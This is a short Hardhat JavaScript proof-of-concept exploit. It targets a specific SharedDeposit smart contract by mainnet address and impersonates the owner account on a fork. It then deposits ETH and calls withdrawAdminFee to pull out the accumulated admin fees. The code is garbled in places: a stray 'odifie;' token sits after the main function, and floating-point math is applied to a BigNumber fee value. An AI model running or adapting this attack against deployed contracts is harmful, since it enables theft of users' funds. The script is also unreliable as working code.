const hre = require("hardhat");

async function main() {
  /*
    This should be run using a fork of the mainnet.
  */
  // For the PoC we'll impersonate the owner so we can perform the attack.
  owner = "0xa1feaf41d843d53d0f6bed86a8cf592ce21c409e";
  // await hre.network.provider.request({
  //     method: "hardhat_impersonateAccount",
  //     params: [owner]}
  //   );
  const ownerSigner = await ethers.provider.getSigner(owner);

  let gas = {gasPrice: 20000000000};

  const SD = await hre.ethers.getContractAt(
    "contracts/SharedDeposit_flat.sol:SharedDeposit",
    "0xbca3b7b87dcb15f0efa66136bc0e4684a3e5da4d",
    ownerSigner,
  );

  let getFees = async () => {
    let fees = await SD.adminFeeTotal();
    console.log("Admin fees:", fees.toString());
    return fees;
  };
  let fees = await getFees();

  // add 0.315% to fees and send and retrieve?
  fees = fees + fees * 0.315;

  // deposit eth = fees
  // call withdrawAdminFees with bal of contract or deposited eth
  await SD.deposit({value: fees, gasPrice: gas.gasPrice});
  fees = await getFees();
  await SD.withdrawAdminFee(fees, gas);
  await getFees();
}
odifie;

main()
  .then(() => process.exit(0))
  .catch(error => {
    console.error(error);
    process.exit(1);
  });
